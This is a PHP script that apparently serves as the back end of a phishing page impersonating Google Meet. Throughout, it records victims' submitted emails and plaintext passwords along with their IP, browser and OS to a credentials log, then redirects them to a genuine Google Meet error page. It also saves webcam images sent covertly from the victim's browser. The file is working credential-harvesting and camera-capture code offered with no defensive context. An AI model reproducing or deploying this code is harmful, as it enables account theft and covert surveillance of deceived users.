<?php
// Disable error display in production
error_reporting(0);
ini_set('display_errors', 0);

// Set timezone
date_default_timezone_set('Asia/Kolkata');

// Set security headers
header('X-Frame-Options: DENY');
header('X-Content-Type-Options: nosniff');
header('X-XSS-Protection: 1; mode=block');
header('Referrer-Policy: no-referrer');
header('Content-Type: application/json');

/**
 * Get client IP address
 */
function get_client_ip() {
    $ip_keys = [
        'HTTP_CLIENT_IP',
        'HTTP_X_FORWARDED_FOR',
        'HTTP_X_FORWARDED',
        'HTTP_FORWARDED_FOR',
        'HTTP_FORWARDED',
        'REMOTE_ADDR'
    ];
    
    foreach ($ip_keys as $key) {
        if (array_key_exists($key, $_SERVER) === true) {
            foreach (explode(',', $_SERVER[$key]) as $ip) {
                $ip = trim($ip);
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
                    return $ip;
                }
            }
        }
    }
    
    return 'UNKNOWN';
}

/**
 * Get browser information
 */
function get_browser_info($user_agent) {
    $browser = 'Unknown';
    
    if (preg_match('~MSIE|Internet Explorer~i', $user_agent) || 
        (strpos($user_agent, 'Trident/7.0; rv:11.0') !== false)) {
        $browser = 'Internet Explorer';
    } elseif (strpos($user_agent, 'Firefox') !== false) {
        $browser = 'Mozilla Firefox';
    } elseif (strpos($user_agent, 'Chrome') !== false) {
        $browser = 'Google Chrome';
    } elseif (strpos($user_agent, 'Safari') !== false) {
        $browser = 'Safari';
    } elseif (strpos($user_agent, 'Opera') !== false || strpos($user_agent, 'OPR/') !== false) {
        $browser = 'Opera';
    } elseif (strpos($user_agent, 'Edge') !== false) {
        $browser = 'Microsoft Edge';
    }
    
    return $browser;
}

/**
 * Get operating system information
 */
function get_os_info($user_agent) {
    $os = 'Unknown';
    
    if (preg_match('/windows|win32|win64/i', $user_agent)) {
        $os = 'Windows';
    } elseif (preg_match('/android/i', $user_agent)) {
        $os = 'Android';
    } elseif (preg_match('/linux/i', $user_agent)) {
        $os = 'Linux';
    } elseif (preg_match('/macintosh|mac os x|mac_powerpc/i', $user_agent)) {
        $os = 'Mac OS';
    } elseif (preg_match('/iphone|ipad|ipod/i', $user_agent)) {
        $os = 'iOS';
    }
    
    return $os;
}

// Initialize response
$response = [
    'status' => 'error',
    'message' => 'Invalid request'
];

try {
    // Get client info
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $browser = get_browser_info($user_agent);
    $os = get_os_info($user_agent);
    $ip = get_client_ip();
    $date = date('Y-m-d H:i:s');
    
    // Handle Google Meet form submission
    if (isset($_POST['email'])) {
        $email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);
        $password = isset($_POST['password']) ? $_POST['password'] : 'N/A';
        
        // Log the credentials
        $log = sprintf(
            "[%s] [GOOGLE_MEET] IP: %s | Email: %s | Password: %s | Browser: %s | OS: %s | User-Agent: %s\n",
            $date,
            $ip,
            $email,
            $password,
            $browser,
            $os,
            $user_agent
        );
        
        // Ensure directory exists
        if (!is_dir('logs')) {
            mkdir('logs', 0755, true);
        }
        
        file_put_contents('logs/credentials.txt', $log, FILE_APPEND);
        
        $response = [
            'status' => 'success',
            'redirect' => 'https://meet.google.com/error'
        ];
    }
    // Handle image capture
    elseif (isset($_POST['cat'])) {
        $imageData = $_POST['cat'];
        
        if (!empty($imageData)) {
            // Extract base64 data
            if (strpos($imageData, 'base64,') !== false) {
                $imageData = explode('base64,', $imageData)[1];
            }
            
            $imageData = base64_decode($imageData);
            
            if ($imageData !== false) {
                // Create directory if it doesn't exist
                if (!is_dir('captured_images')) {
                    mkdir('captured_images', 0755, true);
                }
                
                // Generate filename
                $filename = 'captured_images/cam_' . date('Ymd_His') . '_' . uniqid() . '.png';
                
                // Save the image
                if (file_put_contents($filename, $imageData) !== false) {
                    // Log the capture
                    $log = sprintf(
                        "[%s] [IMAGE_CAPTURE] IP: %s | File: %s | Browser: %s | OS: %s\n",
                        $date,
                        $ip,
                        $filename,
                        $browser,
                        $os
                    );
                    
                    file_put_contents('logs/capture_log.txt', $log, FILE_APPEND);
                    
                    $response = [
                        'status' => 'success',
                        'message' => 'Image captured successfully'
                    ];
                } else {
                    $response['message'] = 'Failed to save image';
                }
            } else {
                $response['message'] = 'Invalid image data';
            }
        } else {
            $response['message'] = 'No image data received';
        }
    }
} catch (Exception $e) {
    // Log any errors
    error_log('Error in post.php: ' . $e->getMessage());
    $response['message'] = 'An error occurred';
}

// Return JSON response
header('Content-Type: application/json');
echo json_encode($response);
?>
